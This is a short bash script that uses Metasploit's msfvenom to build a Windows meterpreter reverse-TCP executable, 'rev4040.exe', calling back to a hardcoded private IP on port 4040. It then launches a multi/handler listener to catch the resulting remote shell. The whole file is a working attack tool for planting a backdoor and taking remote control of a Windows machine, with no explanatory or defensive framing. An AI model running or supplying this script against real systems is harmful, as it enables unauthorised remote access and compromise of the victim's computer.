#!/bin/bash

if [ -z "$1" ]
then
	echo "No Ip chosen.."
	exit
fi
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.121.174 lport=4040 -f exe -o rev4040.exe
msfconsole -qx "use exploit/multi/handler; set payload  windows/meterpreter/reverse_tcp; set lhost $1; set lport 4040;run" 
